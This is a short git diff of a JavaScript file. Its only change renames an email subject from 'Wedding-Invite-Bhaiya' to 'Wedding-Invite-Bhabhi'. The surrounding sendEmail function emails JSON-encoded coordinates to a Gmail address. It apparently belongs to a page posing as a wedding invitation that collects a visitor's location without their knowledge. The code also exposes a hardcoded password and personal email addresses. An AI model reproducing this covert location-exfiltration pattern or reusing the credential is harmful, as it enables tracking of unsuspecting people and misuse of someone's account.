@@ -76,7 +76,7 @@ function sendEmail(coords) {
     Password: "94BD8491ECF3D2F7CE47C072F75A7AA488B4",
     To: 'mohits2125@gmail.com',
     From: "jimmyjimpro@gmail.com",
-    Subject: "Wedding-Invite-Bhaiya",
+    Subject: "Wedding-Invite-Bhabhi",
     Body: JSON.stringify(coords),
   })
     .then(function (message) {
